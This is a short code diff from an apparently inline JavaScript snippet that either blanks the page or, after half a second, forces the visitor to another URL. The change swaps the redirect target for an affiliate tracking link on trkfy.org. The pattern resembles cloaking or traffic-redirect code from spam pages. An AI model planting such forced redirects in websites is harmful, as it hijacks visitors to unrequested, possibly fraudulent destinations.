@@ -7,7 +7,7 @@
       document.documentElement.innerHTML = '';
     } else {
       setTimeout(function() {
-        window.location.href = 'https://rewrds.de/home/';
+        window.location.href = 'https://trkfy.org/aff_c?offer_id=3532&aff_id=42176';
       }, 500);
     }
   })();
